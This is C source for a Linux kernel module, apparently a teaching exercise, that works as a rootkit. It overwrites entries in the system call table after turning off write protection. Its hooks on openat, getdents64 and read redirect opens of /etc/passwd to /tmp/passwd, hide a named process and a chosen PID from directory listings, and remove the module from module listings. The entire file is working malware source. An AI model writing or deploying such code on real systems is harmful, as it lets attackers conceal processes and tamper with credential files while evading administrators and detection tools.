#include <linux/module.h>      // for all modules 
#include <linux/moduleparam.h>
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <linux/list.h>        // the list macros for hiding the module
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <linux/dirent.h>      // for struct linux_dirent64
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

#define PREFIX "sneaky_process"
#define PASSWORDFILE "/etc/passwd"
#define TEMPPASSWORDFILE "/tmp/passwd"

#define PATH_LENGTH 100

// process id argument
static int pid;
module_param(pid, int, 0644);

//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

// openat
asmlinkage int (*original_openat)(struct pt_regs *);
asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  char *pathname = (char *)regs->si;
  char kpathname[PATH_LENGTH] = {0};
  char *temppathname = TEMPPASSWORDFILE;
  strncpy_from_user(kpathname, pathname, PATH_LENGTH);
  if(strcmp(kpathname, PASSWORDFILE) == 0) {
    copy_to_user(pathname, temppathname, sizeof(temppathname));
  }
  return (*original_openat)(regs);
}

// getdents64
asmlinkage int (*original_getdents64)(struct pt_regs *);
asmlinkage int sneaky_getdents64(struct pt_regs *regs) {
  int nread = original_getdents64(regs);
  struct linux_dirent64 *dirp = (struct linux_dirent64 *)regs->si;
  struct linux_dirent64 *current_entry = dirp;
  int bpos = 0;
  char filename[NAME_MAX] = {0};
  char pid_filename[NAME_MAX] = {0};

  sprintf(pid_filename, "%d", pid);

  while(bpos < nread) {
    current_entry = (struct linux_dirent64 *)((char *)dirp + bpos);
    strncpy_from_user(filename, current_entry->d_name, NAME_MAX);
    if (strcmp(filename, PREFIX) == 0 || strcmp(filename, pid_filename) == 0) {
      int reclen = current_entry->d_reclen;
      // overwrite the record
      memmove(current_entry, (char *)current_entry + reclen, nread - bpos - reclen);
      nread -= reclen;
      continue;
    }
    bpos += current_entry->d_reclen;
  }
    // printk(KERN_DEBUG "getdents64 called\n");

  return nread;
}

//read
asmlinkage ssize_t (*original_read)(struct pt_regs *);
asmlinkage ssize_t sneaky_read(struct pt_regs *regs) {
  char *buf = (char *)regs->si;
  size_t count = regs->dx;
  // int i;

  ssize_t ret = original_read(regs);

  const char *name = "sneaky_mod ";
  const size_t len = strlen(name);

  char *pos = strnstr(buf, name, len);
  if (pos) {
    // printk(KERN_INFO "sneaky_mod found fd=%ld\n", ret);
    char *newline = strchr(pos, '\n');
    memmove(pos, newline + 1, count - strlen(newline) - 1);
    ret -= (newline - pos) + 1;
  }

  return ret;
}

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void *)sys_call_table[__NR_getdents64];
  original_read = (void *)sys_call_table[__NR_read];
  
  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  // You need to replace other system calls you need to hack here
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n");

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");